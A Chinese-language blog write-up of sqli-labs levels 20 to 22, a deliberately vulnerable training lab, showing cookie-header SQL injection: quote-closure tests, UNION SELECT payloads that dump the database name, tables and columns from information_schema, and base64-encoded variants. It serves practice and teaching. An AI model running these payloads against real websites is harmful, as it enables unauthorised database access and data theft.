sqli-labs练习(第二十、二十一、二十二关)

发表于 2020-12-20

第二十关 基于错误的cookie头部post注入

首先我们成功登入用户名与密码看看是什么界面

回显有user-agent,ip,也有id,username,password,下方的按钮点击会刷新页面

从题目可以判断是在cookie上注入，依旧要用到火狐浏览器中的modheader、hackbar插件

判断字符型

在modheader插件中输入uname=admin',打开hackbar点击Execute按钮，再刷新页面可以看到一下画面

出现语法错误，说明闭合符为单引号

再出入uname=1' union select 1,2,3 -- #判断字段数

暴库

还是同样的配方uname=1' union select 1,2,database() -- #

暴表

uname=1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security' -- #

暴字段

uname=1' union select 1,2,group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users' -- #

第二十一关 基于base64编码的cookie注入

先来看登入成功页面

RHVtYg== base64解码后：Dumb，本关和Less（20）相似，只是cookie的uname值经过base64编码

判断字符型

Dumb’ or 1=1 –+ base64编码后：RHVtYicgb3IgMT0xIC0tKw==

通过提示我们可以知道此关的闭合符为')

注意，在测试注入点过程中发现使用注释符 #和– #都只会爆下面的错误，也就是无法判断出有一个括号

接下去此关的方法与二十关相同，需要把语句都结果base64编码加密，步骤不再重复操作

注：使用不同的base64解密器可能会得到不同的结果，请大家慎选！！

第二十二关

与二十一关相同

需要注意的两个点：①base64的加密 ②闭合符改为了"
